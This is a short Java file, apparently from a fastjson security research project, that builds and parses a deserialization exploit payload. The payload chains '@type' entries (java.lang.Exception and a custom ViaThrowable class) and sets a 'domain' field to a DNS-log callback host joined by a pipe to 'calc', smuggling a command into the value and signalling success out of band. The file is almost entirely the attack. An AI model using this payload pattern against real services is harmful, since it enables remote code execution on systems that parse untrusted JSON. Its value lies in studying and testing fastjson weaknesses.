package org.heptagram.fastjson;
import com.alibaba.fastjson.JSONObject;

public class ThrowableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ViaThrowable\",\n" +
                "  \"domain\": \"qbknro.dnslog.cn|calc\"\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}

